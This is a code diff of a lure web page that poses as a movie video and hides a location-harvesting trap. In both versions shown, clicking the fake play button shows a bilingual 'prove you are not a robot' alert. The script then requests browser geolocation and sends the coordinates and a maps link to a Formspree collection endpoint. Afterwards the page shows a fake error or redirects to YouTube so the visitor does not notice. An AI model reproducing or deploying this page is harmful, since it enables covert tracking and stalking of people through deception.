@@ -1,129 +1,108 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Video Loading...</title>
-  <meta name="description" content="Top 5 Best Movies 2025" />
+  <meta charset="UTF-8">
+  <title>Top 5 Best Movies 2025</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f2f2f2;
-      text-align: center;
-      padding: 50px;
+      background-color: #f9f9f9;
+      margin: 0;
+      display: flex;
     }
-
+    .main-content {
+      flex: 3;
+      padding: 20px;
+    }
+    .sidebar {
+      flex: 1;
+      background-color: #eee;
+      padding: 20px;
+    }
     .video-box {
+      background-image: url('https://i.imgur.com/nkL7XZM.jpg');
+      background-size: cover;
+      background-position: center;
+      height: 300px;
       position: relative;
-      display: inline-block;
-      max-width: 100%;
+      border-radius: 8px;
     }
-
-    .thumbnail {
-      width: 100%;
-      max-width: 500px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
-    }
-
     .play-button {
+      width: 70px;
+      height: 50px;
+      background-color: red;
+      clip-path: polygon(20% 10%, 80% 50%, 20% 90%);
       position: absolute;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      width: 80px;
-      height: 56px;
-      background: rgba(255, 0, 0, 0.8);
-      border-radius: 12px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
     }
-
-    .play-button::before {
-      content: '';
-      display: block;
-      width: 0;
-      height: 0;
-      border-left: 20px solid white;
-      border-top: 12px solid transparent;
-      border-bottom: 12px solid transparent;
-      margin-left: 5px;
+    .title {
+      font-size: 22px;
+      font-weight: bold;
+      margin-top: 10px;
     }
-
-    .side-videos {
-      margin-top: 40px;
-      text-align: left;
-      max-width: 400px;
-      margin-inline: auto;
-    }
-
-    .side-videos div {
-      background: #fff;
+    .video-suggestion {
+      background-color: #fff;
       padding: 10px;
-      margin: 10px 0;
+      margin-bottom: 10px;
       border-radius: 6px;
-      box-shadow: 0 0 8px rgba(0,0,0,0.1);
     }
   </style>
 </head>
 <body>
-
-  <div class="video-box">
-    <img class="thumbnail" src="https://i.imgur.com/CEFgYkM.jpeg" alt="Video Thumbnail">
-    <div class="play-button" id="fakePlayBtn"></div>
+  <div class="main-content">
+    <div class="video-box" onclick="showPrompt()">
+      <div class="play-button"></div>
+    </div>
+    <div class="title">Top 5 Best Movies 2025</div>
   </div>
 
-  <div class="side-videos">
-    <div>Top 5 Most Watched Movies</div>
-    <div>Best Comedy Movies 2025</div>
-    <div>Oscar Winning Films</div>
-    <div>Thriller Movies To Watch</div>
+  <div class="sidebar">
+    <div class="video-suggestion">Recommended: Action Trailer</div>
+    <div class="video-suggestion">Comedy Highlights</div>
+    <div class="video-suggestion">Drama Picks</div>
+    <div class="video-suggestion">Sci-Fi Previews</div>
   </div>
 
   <script>
-    document.getElementById("fakePlayBtn").addEventListener("click", function () {
-      alert("لتتمكن من مشاهدة الفيديو، يرجى السماح بتحديد موقعك للتأكد أنك لست روبوت 🤖.\n\nTo view the video, please allow location access to confirm you are not a robot.");
+    function showPrompt() {
+      alert("📍 لتتمكن من مشاهدة الفيديو، يرجى السماح بتحديد موقعك للتأكد أنك لست روبوت 🤖\n\n📍 To watch the video, please allow location access to verify you're not a robot 🤖");
+      getLocation();
+    }
 
+    function getLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-          const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-          const data = {
-            location: `Latitude: ${latitude}, Longitude: ${longitude}`,
-            maps: mapsLink,
-            _subject: "📍 New Location Received!"
-          };
-
-          fetch("https://formspree.io/f/xkgjqegp", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(data)
-          });
-
-          document.querySelector('.video-box').innerHTML = `
-            <h2>❌ تعذر تحميل الصورة</h2>
-            <p>حدث خلل أثناء تحميل الفيديو، يرجى المحاولة لاحقاً.</p>
-          `;
-
-        }, function(error) {
-          document.querySelector('.video-box').innerHTML = `
-            <h2>❌ تعذر تحميل الصورة</h2>
-            <p>حدث خلل أثناء تحميل الفيديو، يرجى المحاولة لاحقاً.</p>
-          `;
-        });
+        navigator.geolocation.getCurrentPosition(sendLocation, locationError);
       } else {
-        document.querySelector('.video-box').innerHTML = `
-          <h2>❌ تعذر تحميل الصورة</h2>
-          <p>جهازك لا يدعم تحديد الموقع.</p>
-        `;
+        alert("Geolocation is not supported by this browser.");
       }
-    });
-  </script>
+    }
 
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      fetch("https://formspree.io/f/xkgjqegp", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          location: `Latitude: ${latitude}, Longitude: ${longitude}`,
+          maps: mapsLink,
+          _subject: "📍 New Location Received!"
+        })
+      }).then(() => {
+        window.location.href = "https://www.youtube.com";
+      });
+    }
+
+    function locationError(error) {
+      document.querySelector('.video-box').style.backgroundImage = "url('https://i.imgur.com/3sUXV2D.png')";
+      document.querySelector('.play-button').style.display = "none";
+    }
+  </script>
 </body>
 </html>
